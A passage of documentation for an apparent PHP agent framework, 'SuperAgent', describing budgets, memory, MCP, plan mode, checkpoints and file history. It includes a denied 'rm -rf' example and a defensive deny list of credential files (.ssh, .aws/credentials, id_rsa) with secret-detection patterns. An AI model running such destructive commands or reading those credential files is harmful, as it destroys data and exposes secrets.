    'session_budget_usd' => (float) env('SUPERAGENT_SESSION_BUDGET', 0),
    'monthly_budget_usd' => (float) env('SUPERAGENT_MONTHLY_BUDGET', 0),
],
```

### Usage

```php
use SuperAgent\CostAutopilot\BudgetConfig;
use SuperAgent\CostAutopilot\CostAutopilot;

$config = BudgetConfig::fromArray([
    'session_budget_usd' => 5.00,
    'monthly_budget_usd' => 100.00,
]);

$autopilot = new CostAutopilot($config);
$autopilot->setCurrentModel('claude-opus-4-20250514');

$decision = $autopilot->evaluate($sessionCostUsd);

if ($decision->hasDowngrade()) {
    $provider->setModel($decision->newModel);
}
if ($decision->shouldCompact()) {
    $queryEngine->compactMessages();
}
if ($decision->shouldHalt()) {
    break;
}
```

### Troubleshooting

**Autopilot never triggers.** Check that `cost_autopilot.enabled` is `true` and at least one budget is set. Verify you are calling `evaluate()` with the cumulative session cost.

**Spending data is lost between process restarts.** Pass a file path to `BudgetTracker` constructor.

---

## 9. Token Budget Continuation

> Dynamic budget-based agent loop control with 90% completion threshold, diminishing returns detection, and nudge-based continuation -- replacing fixed maxTurns.

### Overview

The Token Budget system replaces fixed `maxTurns` with a dynamic, budget-aware strategy. The agent continues until:

1. **90% of the token budget is consumed**, or
2. **Diminishing returns are detected** (two consecutive low-delta turns after 3+ continuations)

### Usage

```php
use SuperAgent\TokenBudget\TokenBudgetTracker;

$tracker = new TokenBudgetTracker();

$decision = $tracker->check(
    budget: 50_000,
    globalTurnTokens: 20_000,
    isSubAgent: false,
);

if ($decision->shouldContinue()) {
    $messages[] = new UserMessage($decision->nudgeMessage);
} elseif ($decision->shouldStop()) {
    // Handle stop
}
```

### Troubleshooting

**Agent stopping too early** -- Increase the `tokenBudget` value.

**Sub-agents not running multiple turns** -- Sub-agents always stop after one turn by design.

---

## 10. Smart Context Window

> Dynamic token allocation between thinking and context based on task complexity, with strategy presets and per-task overrides.

### Overview

The Smart Context Window system dynamically partitions the total token budget between **thinking** (extended reasoning) and **context** (conversation history) based on task complexity.

### Strategy Presets

| Strategy | Thinking | Context | Keep Recent |
|----------|----------|---------|-------------|
| `deep_thinking` | 60% | 40% | 4 messages |
| `balanced` | 40% | 60% | 8 messages |
| `broad_context` | 15% | 85% | 16 messages |

### Usage

```php
$manager = new SmartContextManager(totalBudgetTokens: 100_000);

$allocation = $manager->allocate('Refactor the auth module to use OAuth2 with PKCE flow');
// strategy=deep_thinking, thinking=60K, context=40K

$allocation = $manager->allocate('Show me the contents of config.php');
// strategy=broad_context, thinking=15K, context=85K

$manager->setForceStrategy('deep_thinking'); // Override
```

### Troubleshooting

**Thinking budget not being applied** -- Explicit `options['thinking']` takes precedence over Smart Context allocation.

---

## 11. Adaptive Feedback

> A learning system that tracks recurring user corrections and denials, then automatically promotes persistent patterns into guardrails rules or memory entries so the agent avoids repeating the same mistakes.

### Overview

Every time a user denies a tool execution, reverts an edit, rejects output, or gives explicit behavioral feedback, the Adaptive Feedback system records a **correction pattern**. When a pattern crosses a configurable promotion threshold (default: 3 occurrences), the system automatically promotes it:

- **Tool denials** and **edit reversions** become **Guardrails rules**
- **Behavior corrections**, **content unwanted**, and **output rejections** become **Memory entries**

### The 5 Correction Categories

| Category | Trigger | Promotes To |
|---|---|---|
| Tool Denied | User denies a tool permission request | Guardrails rule |
| Output Rejected | User says "no", "wrong", rejects result | Memory entry |
| Behavior Correction | Explicit feedback like "stop adding comments" | Memory entry |
| Edit Reverted | User undoes an agent file edit | Guardrails rule |
| Content Unwanted | User flags content as unnecessary | Memory entry |

### Usage

```php
$collector = new CorrectionCollector($store);
$collector->recordDenial('Bash', ['command' => 'rm -rf /tmp/data'], 'User denied');
$collector->recordCorrection('stop adding docstrings to every function');

$engine = new AdaptiveFeedbackEngine($store, promotionThreshold: 3, autoPromote: true);
$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setMemoryStorage($memoryStorage);
$promotions = $engine->evaluate();
```

### Troubleshooting

**Patterns are not being promoted.** Verify `auto_promote` is `true` and `evaluate()` is being called.

---

## 12. Skill Distillation

> Automatically captures successful agent execution traces and distills them into reusable Markdown skill templates that cheaper models can follow, dramatically reducing cost for recurring tasks.

### Overview

When an expensive model solves a multi-step task, the Skill Distillation system captures the full execution trace and distills it into a step-by-step skill template for cheaper models.

| Source Model | Target Model | Estimated Savings |
|---|---|---|
| Claude Opus | Claude Sonnet | ~70% |
| Claude Sonnet | Claude Haiku | ~83% |
| GPT-4o | GPT-4o-mini | ~88% |

### Usage

```php
$trace = ExecutionTrace::fromMessages($prompt, $messages, $model, $cost, $inTokens, $outTokens, $turns);
$store = new DistillationStore(storage_path('superagent/distilled_skills.json'));
$engine = new DistillationEngine($store, minSteps: 3, minCostUsd: 0.01);

if ($engine->isWorthDistilling($trace)) {
    $skill = $engine->distill($trace, 'add-input-validation');
}
```

### Troubleshooting

**Traces are never distilled.** Check that `min_steps` and `min_cost_usd` thresholds are met. Traces with errors are rejected.

---

## 13. Memory System

> Cross-session persistent memory with real-time extraction, KAIROS append-only daily logs, and nightly auto-dream consolidation into a structured MEMORY.md index.

### Overview

The SuperAgent Memory System operates at three layers:

1. **Real-time session memory extraction** -- 3-gate trigger mechanism (token threshold, token growth, activity threshold)
2. **KAIROS daily logs** -- Append-only timestamped log
3. **Auto-dream consolidation** -- 4-phase process (Orient, Gather, Consolidate, Prune)

### Memory Types

| Type | Description | Default Scope |
|------|-------------|---------------|
| `user` | User's role, goals, responsibilities | `private` |
| `feedback` | Guidance about how to approach work | `private` |
| `project` | Ongoing work, goals, incidents not derivable from code | `team` |
| `reference` | Pointers to external systems | `team` |

### Configuration

```php
$config = new MemoryConfig(
    minimumMessageTokensToInit: 8000,
    minimumTokensBetweenUpdate: 4000,
    toolCallsBetweenUpdates: 5,
    autoDreamMinHours: 24,
    autoDreamMinSessions: 5,
    maxMemoryFiles: 200,
    maxEntrypointLines: 200,
    maxEntrypointBytes: 25000,
    staleMemoryDays: 30,
    expireMemoryDays: 90,
);
```

### Usage

```php
// Session memory extraction
$extractor = new SessionMemoryExtractor($provider, $config, $logger);
$extractor->maybeExtract($messages, $sessionId, $memoryBasePath, $lastTurnHadToolCalls);

// Daily logs
$dailyLog = new DailyLog($memoryDir, $logger);
$dailyLog->append('User prefers factory pattern over builder');

// Auto-dream consolidation
$consolidator = new AutoDreamConsolidator($storage, $provider, $config, $logger);
if ($consolidator->shouldRun()) {
    $consolidator->run();
}
```

### Troubleshooting

**Memories not being extracted** -- Verify conversation has at least 8,000 tokens.

**Auto-dream not running** -- Confirm at least 24 hours and 5 sessions since last run.

---

## 14. Knowledge Graph

> A shared, persistent graph of files, symbols, agents, and decisions that accumulates across multi-agent sessions -- enabling subsequent agents to skip redundant codebase exploration.

### Overview

When agents execute tool calls, the Knowledge Graph automatically captures events as **nodes** (File, Symbol, Agent, Decision, Tool) and **edges** (Read, Modified, Created, Depends On, Decided, Searched, Executed, Defined In) in a directed graph.

### Usage

```php
$graph = new KnowledgeGraph(storage_path('superagent/knowledge_graph.json'));
$collector = new GraphCollector($graph, 'my-agent');

$collector->recordToolCall('Read', ['file_path' => '/src/App.php'], 'file content...');
$collector->recordToolCall('Edit', ['file_path' => '/src/App.php'], 'OK');
$collector->recordDecision('Chose repository pattern for data access');

$hotFiles = $graph->getHotFiles(10);
$agents = $graph->getAgentsForFile('src/App.php');
$summary = $graph->getSummary();
```

### Troubleshooting

**Graph is empty** -- Verify `knowledge_graph.enabled` is `true` and `GraphCollector::recordToolCall()` is being called.

**Graph grows too large** -- The collector limits Grep/Glob results to 20 files per call. Periodically export and clear.

---

## 15. Extended Thinking

> Adaptive, enabled, or disabled thinking modes with ultrathink keyword trigger, model capability detection, and budget token management.

### Overview

Extended Thinking allows the agent to perform explicit chain-of-thought reasoning. Three modes:

| Mode | Behavior |
|------|----------|
| **adaptive** | Model decides when and how much to think. Default for Claude 4.6+. |
| **enabled** | Always think with a configurable fixed budget. |
| **disabled** | No thinking. Fastest and cheapest. |

The **ultrathink** keyword trigger maximizes budget to 128,000 tokens.

### Usage

```php
$config = ThinkingConfig::adaptive();
$config = ThinkingConfig::enabled(budgetTokens: 20_000);
$config = ThinkingConfig::disabled();

// Ultrathink
$boosted = $config->maybeApplyUltrathink('ultrathink: analyze the race condition');
// mode=enabled, budget=128000

// Model capability detection
ThinkingConfig::modelSupportsThinking('claude-opus-4-20260401');   // true
ThinkingConfig::modelSupportsAdaptiveThinking('claude-opus-4-6');   // true

// API parameters
$param = $config->toApiParameter('claude-sonnet-4-20260401');
// ['type' => 'enabled', 'budget_tokens' => 20000]
```

### Troubleshooting

**Thinking not activating** -- Verify model supports thinking. Only Claude 4+ and Claude 3.5 Sonnet v2+ support it.

**Ultrathink not working** -- Requires the `ultrathink` experimental feature flag.

---

## 16. MCP Protocol Integration

> Connect SuperAgent to external tool servers using the Model Context Protocol (MCP), with support for stdio, HTTP, and SSE transports, automatic tool discovery, server instruction injection, and a TCP bridge that shares stdio connections with child processes.

### Overview

SuperAgent implements a full MCP client with three core classes:

- **`MCPManager`** -- Singleton registry for server configurations, connections, and tool aggregation
- **`Client`** -- JSON-RPC client for the MCP protocol lifecycle
- **`MCPBridge`** -- TCP proxy for sharing stdio connections with child processes

### Transports

| Transport | Use case |
|-----------|----------|
| **stdio** | Spawns a local process, communicates via stdin/stdout |
| **HTTP** | Connects to an HTTP endpoint |
| **SSE** | Connects to a Server-Sent Events endpoint |

### Configuration

```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@anthropic/mcp-server-filesystem", "/home/user/projects"],
      "env": { "NODE_ENV": "production" }
    },
    "remote-api": {
      "type": "http",
      "url": "https://mcp.example.com/v1",
      "headers": { "Authorization": "Bearer ${API_TOKEN}" }
    }
  }
}
```

### Usage

```php
$manager = MCPManager::getInstance();
$manager->loadFromClaudeCode('/path/to/project');
$manager->autoConnect();

$tools = $manager->getTools();
$result = $manager->getTool('mcp_filesystem_readFile')->execute(['path' => '/home/user/example.txt']);
$instructions = $manager->getConnectedInstructions();
```

### TCP Bridge

```
Parent:   StdioTransport <-> MCPBridge TCP listener (:port)
Child 1:  HttpTransport -> localhost:port --> MCPBridge --> StdioTransport
```

Bridge info is written to `/tmp/superagent_mcp_bridges_<pid>.json`.

### Troubleshooting

| Problem | Solution |
|---------|----------|
| "MCP server 'X' not registered" | Check JSON config or call `registerServer()` |
| "Failed to start MCP server" | Verify the command works standalone |
| Bridge not discovered by child | Check `/tmp/superagent_mcp_bridges_*.json` |
| Environment variables not expanded | Use `${VAR}` or `${VAR:-default}`, not `$VAR` |

---

## 17. Bridge Mode

> Transparently enhance non-Anthropic LLM providers (OpenAI, Ollama, Bedrock, OpenRouter) with SuperAgent's optimized system prompts, bash security validation, context compaction, cost tracking, and more.

### Overview

Bridge Mode wraps any `LLMProvider` with an enhancement pipeline. Two phases per LLM call:

1. **Pre-request**: Enhancers modify messages, tools, system prompt, and options
2. **Post-response**: Enhancers inspect and transform the `AssistantMessage`

### Available Enhancers

1. **SystemPromptEnhancer** -- Injects optimized system prompt sections
2. **ContextCompactionEnhancer** -- Reduces message context size without LLM call
3. **BashSecurityEnhancer** -- Validates bash commands in responses
4. **MemoryInjectionEnhancer** -- Injects relevant memory context
5. **ToolSchemaEnhancer** -- Enhances tool schemas with metadata
6. **ToolSummaryEnhancer** -- Adds summarized tool documentation
7. **TokenBudgetEnhancer** -- Manages token budget constraints
8. **CostTrackingEnhancer** -- Tracks token usage and cost

### Usage

```php
use SuperAgent\Bridge\BridgeFactory;

// Auto-detect provider from config, apply all enabled enhancers
$provider = BridgeFactory::createProvider('gpt-4o');

// Or wrap an existing provider
$enhanced = BridgeFactory::wrapProvider($openai);

// Or assemble manually
$enhanced = new EnhancedProvider(
    inner: new OllamaProvider(['base_url' => 'http://localhost:11434', 'model' => 'codellama']),
    enhancers: [new SystemPromptEnhancer(), new BashSecurityEnhancer()],
);
```

### Troubleshooting

**"Unsupported bridge provider: anthropic"** -- Anthropic providers do not need bridge enhancement.

**Blocked bash commands in response** -- The `BashSecurityEnhancer` replaces dangerous tool_use blocks with text warnings.

---

## 18. Telemetry & Observability

> Full observability stack with a master switch and independent per-subsystem controls for tracing, structured logging, metrics collection, cost tracking, event dispatching, and per-event-type sampling.

### Overview

Five independent subsystems, all gated behind a master `telemetry.enabled` switch:

| Subsystem | Class | Config key |
|-----------|-------|-----------|
| **Tracing** | `TracingManager` | `telemetry.tracing.enabled` |
| **Logging** | `StructuredLogger` | `telemetry.logging.enabled` |
| **Metrics** | `MetricsCollector` | `telemetry.metrics.enabled` |
| **Cost tracking** | `CostTracker` | `telemetry.cost_tracking.enabled` |
| **Events** | `EventDispatcher` | `telemetry.events.enabled` |
| **Sampling** | `EventSampler` | (inline config) |

### Usage

```php
// Tracing
$tracing = TracingManager::getInstance();
$span = $tracing->startInteractionSpan('user-query');
$llmSpan = $tracing->startLLMRequestSpan('claude-3-sonnet', $messages);
$tracing->endSpan($llmSpan, ['input_tokens' => 1500]);

// Structured Logging (auto-sanitizes sensitive data)
$logger = StructuredLogger::getInstance();
$logger->logLLMRequest('claude-3-sonnet', $messages, $response, 1250.5);

// Metrics
$metrics = MetricsCollector::getInstance();
$metrics->incrementCounter('llm.requests', 1, ['model' => 'claude-3-sonnet']);
$metrics->recordHistogram('llm.request_duration_ms', 1250.5);

// Cost Tracking
$tracker = CostTracker::getInstance();
$cost = $tracker->trackLLMUsage('claude-3-sonnet', 1500, 800, 'sess-abc');

// Event Dispatching
$dispatcher = EventDispatcher::getInstance();
$dispatcher->listen('tool.completed', function (array $data) { /* ... */ });

// Sampling
$sampler = new EventSampler([
    'llm.request' => ['sample_rate' => 1.0],
    'tool.started' => ['sample_rate' => 0.1],
]);
```

### Troubleshooting

| Problem | Solution |
|---------|----------|
| No telemetry output | Set `telemetry.enabled` to `true` |
| Unknown model cost = 0 | Add via `updateModelPricing()` or config |
| Event listeners not firing | Enable `telemetry.events.enabled` |

---

## 19. Tool Search & Deferred Loading

> Fuzzy keyword search with weighted scoring, direct selection mode, and automatic deferred loading when tool definitions exceed 10% of the context window. Includes task-based prediction for preloading relevant tools.

### Overview

Three layers:

- **`ToolSearchTool`** -- User-facing search tool with direct selection (`select:Name1,Name2`) and fuzzy keyword search
- **`LazyToolResolver`** -- On-demand tool resolution with task-based prediction
- **`ToolLoader`** -- Low-level loader with category-based loading and per-tool metadata

Deferred loading engages when total tool token cost exceeds **10%** of the model's context window.

### Scoring System

| Match type | Points |
|-----------|--------|
| Exact name-part match | **10** |
| Exact name-part match (MCP tool) | **12** |
| Partial name-part match | **6** (or 7.2 for MCP) |
| Search hint match | **4** |
| Description match | **2** |
| Full name contains query | **10** |

### Usage

```php
// Direct selection
$result = $tool->execute(['query' => 'select:Read,Edit,Grep']);

// Keyword search
$result = $tool->execute(['query' => 'notebook jupyter', 'max_results' => 5]);

// Task-based prediction
$loaded = $resolver->predictAndPreload('Search for TODO comments and edit the files');

// Check if deferred loading should be active
$shouldDefer = ToolSearchTool::shouldDeferTools(totalToolTokens: 20000, contextWindow: 128000);
```

### Troubleshooting

| Problem | Solution |
|---------|----------|
| Search returns no results | Call `registerTool()` or `registerTools()` |
| High memory usage | Use `unloadUnused()` to free memory |

---

## 20. Incremental & Lazy Context

> Delta-based context synchronization with automatic checkpoints and compression, plus lazy fragment loading with relevance scoring, TTL cache, LRU eviction, and a `getSmartWindow` API that fits the most relevant context into a token budget.

### Overview

Two complementary systems:

- **Incremental Context** -- Tracks changes to conversation context over time via deltas between checkpoints. Supports auto-compression, smart windows, and checkpoint/restore.
- **Lazy Context** -- Registers context fragments as metadata, loading on demand based on task relevance. Includes TTL caching, LRU eviction, and priority-based preloading.

### Usage

#### Incremental Context

```php
$ctx = new IncrementalContextManager([
    'auto_compress' => true,
    'compress_threshold' => 4000,
    'checkpoint_interval' => 10,
]);

$ctx->initialize($messages);
$ctx->addMessage($userMessage);

$delta = $ctx->getDelta();
$window = $ctx->getSmartWindow(maxTokens: 4000);
$summary = $ctx->getSummary();
```

#### Lazy Context

```php
$lazy = new LazyContextManager([
    'max_memory' => 50 * 1024 * 1024,
    'cache_ttl' => 600,
]);

$lazy->registerContext('project-readme', [
    'type' => 'documentation',
    'priority' => 7,
    'tags' => ['docs', 'overview'],
    'data' => [['role' => 'system', 'content' => 'Project overview: ...']],
]);

$lazy->registerContext('git-history', [
    'type' => 'code',
    'priority' => 5,
    'tags' => ['git', 'history'],
    'source' => function ($id, $meta) {
        return [['role' => 'system', 'content' => shell_exec('git log --oneline -20')]];
    },
]);

$context = $lazy->getContextForTask('Fix the OAuth2 bug', hints: ['auth', 'oauth']);
$window = $lazy->getSmartWindow(maxTokens: 8000, focusArea: 'auth');
```

### Troubleshooting

| Problem | Solution |
|---------|----------|
| "Checkpoint not found" | Increase `max_checkpoints` or use latest |
| High memory in lazy context | Lower `max_memory` or call `unloadStale()` |
| Compression too aggressive | Set `compression_level` to `'minimal'` |
| Stale context fragments | Reduce `cache_ttl` or call `clear()` |

---

## 21. Plan V2 Interview Phase

> Iterative pair-planning workflow where the agent explores the codebase collaboratively with the user, builds a structured plan file incrementally, and requires explicit approval before any code modifications begin. Includes periodic reminders and post-execution verification.

### Overview

Plan mode provides a disciplined workflow for complex changes. The agent enters a read-only exploration phase where it can only use read tools, updates a plan file as it learns, and asks the user about ambiguities. No files are modified until explicit approval.

Three tools manage the lifecycle:

- **`EnterPlanModeTool`** -- Enters plan mode with interview or traditional 5-phase workflow
- **`ExitPlanModeTool`** -- Exits with `review`, `execute`, `save`, or `discard`
- **`VerifyPlanExecutionTool`** -- Tracks execution of planned steps and reports progress

### Plan File Structure

```markdown
# Plan: Add OAuth2 authentication to the API

Created: 2026-04-04 10:30:00

## Context
*Why this change is needed*

## Recommended Approach
*One clear implementation path*

## Critical Files
*Files to modify with line numbers*

## Existing Code to Reuse
*Functions, utilities, patterns*

## Verification
*How to test the changes*
```

### Usage

```php
// Enter plan mode
$enter = new EnterPlanModeTool();
$result = $enter->execute([
    'description' => 'Add OAuth2 authentication to the API',
    'estimated_steps' => 8,
    'interview' => true,
]);

// Agent explores and updates plan incrementally
EnterPlanModeTool::updatePlanFile('Context', 'The API currently uses basic API key auth...');
EnterPlanModeTool::updatePlanFile('Critical Files', "- `app/Http/Middleware/ApiAuth.php`...");
EnterPlanModeTool::addStep(['tool' => 'edit_file', 'description' => 'Add OAuth2ServiceProvider']);

// Exit and execute
$exit = new ExitPlanModeTool();
$result = $exit->execute(['action' => 'execute']);

// Verify each step
$verifier = new VerifyPlanExecutionTool();
$verifier->execute(['step_number' => 1, 'tool' => 'write_file', 'result' => 'success']);
$verifier->execute(['step_number' => 2, 'tool' => 'edit_file', 'result' => 'success',
    'deviation' => 'Used Passport package instead of custom implementation']);
```

### Interview Phase Workflow

```
Enter plan mode
     |
     v
+--> Explore (Glob/Grep/Read) ----+
|    |                              |
|    v                              |
|    Update plan file              |
|    |                              |
|    v                              |
|    Ask user about ambiguities     |
|    |                              |
+----+ (repeat until complete)      |
     |                              |
     v                              |
Exit plan mode --> User approval    |
     |                              |
     v                              |
Execute steps <----+                |
     |             |                |
     v             |                |
Verify step -------+                |
     |                              |
     v                              |
Execution summary                   |
```

### Troubleshooting

| Problem | Solution |
|---------|----------|
| "Already in plan mode" | Call `ExitPlanModeTool` with `discard` or `review` |
| "Not in plan mode" | Call `EnterPlanModeTool` first |
| Agent modifying files during plan | Reminders fire every 5 turns; check `getPlanModeReminder()` |
| Interview phase not activating | Check `ExperimentalFeatures::enabled('plan_interview')` or force with `setInterviewPhaseEnabled(true)` |

---

## 22. Checkpoint & Resume

> Periodic state snapshots that allow an agent to resume from where it left off after a crash, timeout, or interruption -- instead of starting over from scratch.

### Overview

Long-running agent tasks can be interrupted by process crashes, timeouts, or manual cancellation. The Checkpoint & Resume system periodically saves the full agent state to disk. When the agent restarts, it can resume from the latest checkpoint.

Key behaviors:

- **Interval-based**: Checkpoints every N turns (default: 5)
- **Auto-pruning**: Only latest N checkpoints per session kept (default: 5)
- **Per-task override**: Force-enable or force-disable per invocation
- **Full state capture**: Messages, turn count, cost, token usage, sub-component state

### Configuration

```php
'checkpoint' => [
    'enabled' => env('SUPERAGENT_CHECKPOINT_ENABLED', false),
    'interval' => (int) env('SUPERAGENT_CHECKPOINT_INTERVAL', 5),
    'max_per_session' => (int) env('SUPERAGENT_CHECKPOINT_MAX', 5),
],
```

### Usage

```php
use SuperAgent\Checkpoint\CheckpointManager;
use SuperAgent\Checkpoint\CheckpointStore;

$store = new CheckpointStore(storage_path('superagent/checkpoints'));
$manager = new CheckpointManager($store, interval: 5, maxPerSession: 5, configEnabled: true);

// In the agent loop, after each turn:
$checkpoint = $manager->maybeCheckpoint(
    sessionId: $sessionId,
    messages: $messages,
    turnCount: $currentTurn,
    totalCostUsd: $totalCost,
    turnOutputTokens: $outputTokens,
    model: $model,
    prompt: $originalPrompt,
);

// On startup, check for an existing checkpoint
$latest = $manager->getLatest($sessionId);
if ($latest !== null) {
    $state = $manager->resume($latest->id);
    $messages     = $state['messages'];
    $turnCount    = $state['turnCount'];
    $totalCost    = $state['totalCostUsd'];
    $model        = $state['model'];
    $prompt       = $state['prompt'];
}

// Force-create a checkpoint (e.g., before a risky operation)
$checkpoint = $manager->createCheckpoint($sessionId, $messages, $turnCount, ...);

// Per-task override
$manager->setForceEnabled(true);   // Force on
$manager->setForceEnabled(false);  // Force off
$manager->setForceEnabled(null);   // Use config default
```

### CLI Management

```bash
php artisan superagent:checkpoint list
php artisan superagent:checkpoint list --session=abc123
php artisan superagent:checkpoint show <checkpoint-id>
php artisan superagent:checkpoint resume <checkpoint-id>
php artisan superagent:checkpoint delete <checkpoint-id>
php artisan superagent:checkpoint clear
php artisan superagent:checkpoint prune --keep=3
php artisan superagent:checkpoint stats
```

### Troubleshooting

**Checkpoints are not being created.** Verify `checkpoint.enabled` is `true` (or use `setForceEnabled(true)`). Confirm that `maybeCheckpoint()` is being called and the turn count is a multiple of the interval.

**Checkpoint files are growing large.** Each checkpoint contains the full serialized message history. Increase the interval or reduce `max_per_session`.

**Resuming fails with "Unknown message class".** The serialized data contains an unrecognized message type. Supported types: `assistant`, `tool_result`, `user`.

**Checkpoint ID collisions.** IDs are deterministic: `md5(sessionId:turnCount)`. The second checkpoint at the same turn overwrites the first.

---

## 23. File History

> Per-file snapshot system with LRU-evicted per-message snapshots (100 max), per-message rewind, diff stats, snapshot inheritance for unchanged files, undo/redo stack, git attribution, and sensitive file protection.

### Overview

The file history system has four components:

- **`FileSnapshotManager`** -- Core snapshot engine. Creates and restores per-file snapshots, manages per-message snapshots with LRU eviction (100 max), supports rewind-to-message, and computes diff stats.
- **`UndoRedoManager`** -- Undo/redo stack (100 max) for file operations (create, edit, delete, rename).
- **`GitAttribution`** -- Adds AI co-author attribution to git commits, stages files, and provides change summaries.
- **`SensitiveFileProtection`** -- Blocks write/delete operations on sensitive files and detects secrets in content before writing.

### Usage

#### Creating and Restoring Snapshots

```php
$manager = FileSnapshotManager::getInstance();

$snapshotId = $manager->createSnapshot('/path/to/file.php');
$success = $manager->restoreSnapshot($snapshotId);

// Per-message snapshots and rewind
$manager->trackEdit('/path/to/file.php', 'msg-001');
$manager->makeMessageSnapshot('msg-001');
$changedPaths = $manager->rewindToMessage('msg-001');
```

#### Diff Stats

```php
$diff = $manager->getDiff('/path/to/file.php', $fromSnapshotId, $toSnapshotId);
$stats = $manager->getDiffStats('msg-001');
// DiffStats { filesChanged: [...], insertions: 15, deletions: 3 }
```

#### Undo/Redo

```php
$undoRedo = UndoRedoManager::getInstance();
$undoRedo->recordAction(FileAction::edit('/path/to/file.php', $afterSnapshotId, $beforeSnapshotId));
$undoRedo->recordAction(FileAction::create('/path/to/new.php', $content, $snapshotId));
$undoRedo->undo();
$undoRedo->redo();
```

| Action type | Undo | Redo |
|-------------|------|------|
| `create` | Delete the file | Restore from snapshot |
| `edit` | Restore previous snapshot | Restore after-edit snapshot |
| `delete` | Restore from snapshot | Delete the file again |
| `rename` | Rename back | Rename forward |

#### Git Attribution

```php
$git = GitAttribution::getInstance();

if ($git->isGitRepository()) {
    $git->createCommit(
        message: 'Add OAuth2 authentication',
        files: ['app/Http/Middleware/OAuth2.php', 'config/auth.php'],
        options: ['context' => 'Part of the auth upgrade', 'include_summary' => true],
    );
    // Includes Co-Authored-By: SuperAgent AI <ai@superagent.local>
}
```

#### Sensitive File Protection

```php
$protection = SensitiveFileProtection::getInstance();

$protection->isProtected('.env');                    // true
$protection->isProtected('app/Models/User.php');     // false

$result = $protection->checkOperation('write', '.env');
$result->allowed; // false

$secrets = $protection->detectSecrets('api_key=sk-1234567890abcdef');
// [['type' => 'api_key', 'pattern_matched' => true, 'position' => 0]]

$protection->addProtectedPattern('*.vault');
$protection->addProtectedFile('/path/to/specific/file.conf');
```

Default protected patterns include: `*.env`, `.env.*`, `*.key`, `*.pem`, `*.p12`, `*.pfx`, `*_rsa`, `*_dsa`, `id_rsa*`, `.htpasswd`, `.npmrc`, `*.sqlite`, `*.db`, `secrets.*`, `credentials.*`, `auth.*`, `.ssh/*`, `.aws/credentials`, `.git/config`, and more.

Secret detection patterns: `api_key`, `aws_key`, `private_key` (PEM headers), `token`/`bearer`, `password`, `database_url` (connection strings with credentials).

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| Snapshot returns null | File doesn't exist or snapshots disabled | Check `file_exists()` and `isEnabled()` |
| Rewind fails | Message ID not in snapshot map | Check `canRewindToMessage()` first |
| Old snapshots missing | LRU eviction | Increase `MAX_MESSAGE_SNAPSHOTS` (default 100) |
| Sensitive file write blocked | File matches protected pattern | Remove pattern or disable protection for testing |
| Git commit fails | No staged changes or not a git repo | Check `hasStagedChanges()` and `isGitRepository()` |
| Undo doesn't work | No snapshot ID recorded | Ensure `createSnapshot()` before and after edits |

---

## 24. Performance Optimization

> 13 configurable strategies that reduce token consumption (30-50%), lower cost (40-60%), improve cache hit rates (~90%), and speed up tool execution through parallelism.

### Overview

SuperAgent v0.7.0 introduces two optimization layers integrated into the `QueryEngine` pipeline:

- **Token Optimizations** (`src/Optimization/`) — 5 strategies that reduce API input/output tokens
- **Execution Performance** (`src/Performance/`) — 8 strategies that speed up runtime execution

All optimizations are initialized automatically in the `QueryEngine` constructor via `fromConfig()` and applied transparently in `callProvider()` and `executeTools()`. Each can be independently disabled via env vars.

### Configuration

```php
// config/superagent.php

'optimization' => [
    'tool_result_compaction' => [
        'enabled' => env('SUPERAGENT_OPT_TOOL_COMPACTION', true),
        'preserve_recent_turns' => 2,   // Keep last N turns intact
        'max_result_length' => 200,     // Max chars for compacted result
    ],
    'selective_tool_schema' => [
        'enabled' => env('SUPERAGENT_OPT_SELECTIVE_TOOLS', true),
        'max_tools' => 20,              // Max tools to include per request
    ],
    'model_routing' => [
        'enabled' => env('SUPERAGENT_OPT_MODEL_ROUTING', true),
        'fast_model' => env('SUPERAGENT_OPT_FAST_MODEL', 'claude-haiku-4-5-20251001'),
        'min_turns_before_downgrade' => 2,
    ],
    'response_prefill' => [
        'enabled' => env('SUPERAGENT_OPT_RESPONSE_PREFILL', true),
    ],
    'prompt_cache_pinning' => [
        'enabled' => env('SUPERAGENT_OPT_CACHE_PINNING', true),
        'min_static_length' => 500,
    ],
],

'performance' => [
    'parallel_tool_execution' => [
        'enabled' => env('SUPERAGENT_PERF_PARALLEL_TOOLS', true),
        'max_parallel' => 5,
    ],
    'streaming_tool_dispatch' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_DISPATCH', true),
    ],
    'connection_pool' => [
        'enabled' => env('SUPERAGENT_PERF_CONNECTION_POOL', true),
    ],
    'speculative_prefetch' => [
        'enabled' => env('SUPERAGENT_PERF_SPECULATIVE_PREFETCH', true),
        'max_cache_entries' => 50,
        'max_file_size' => 100000,
    ],
    'streaming_bash' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_BASH', true),
        'max_output_lines' => 500,
        'tail_lines' => 100,
        'stream_timeout_ms' => 30000,
    ],
    'adaptive_max_tokens' => [
        'enabled' => env('SUPERAGENT_PERF_ADAPTIVE_TOKENS', true),
        'tool_call_tokens' => 2048,
        'reasoning_tokens' => 8192,
    ],
    'batch_api' => [
        'enabled' => env('SUPERAGENT_PERF_BATCH_API', false),  // Disabled by default
        'max_batch_size' => 100,
    ],
    'local_tool_zero_copy' => [
        'enabled' => env('SUPERAGENT_PERF_ZERO_COPY', true),
        'max_cache_size_mb' => 50,
    ],
],
```

### Token Optimizations

#### Tool Result Compaction (`ToolResultCompactor`)

Replaces old tool results with concise summaries. Results beyond the last N turns are compacted to `"[Compacted] Read: <?php class Agent..."`. Error results are preserved intact.

```php
use SuperAgent\Optimization\ToolResultCompactor;

$compactor = new ToolResultCompactor(
    enabled: true,
    preserveRecentTurns: 2,
    maxResultLength: 200,
);

// Compact a message array (returns new array, originals unchanged)
$compacted = $compactor->compact($messages);
```

**Impact**: 30-50% input token reduction in multi-turn conversations.

#### Selective Tool Schema (`ToolSchemaFilter`)

Sends only relevant tool schemas per turn instead of all 59. Detects the current task phase from recent tool usage:

| Phase | Detected When | Tools Included |
|-------|--------------|----------------|
| Explore | Last tool was Read/Grep/Glob/WebSearch | read, grep, glob, bash, web_search, web_fetch |
| Edit | Last tool was Edit/Write | read, write, edit, bash, grep, glob |
| Plan | Last tool was Agent/PlanMode | read, grep, glob, agent, enter_plan_mode, exit_plan_mode |
| First turn | No tool history | All tools (no filtering) |

Always includes `read` and `bash`. Also includes any tool used in the last 2 turns. Minimum 5 tools threshold — if filtering would be too aggressive, all tools pass through.

**Impact**: ~10K tokens saved per request.

#### Per-Turn Model Routing (`ModelRouter`)

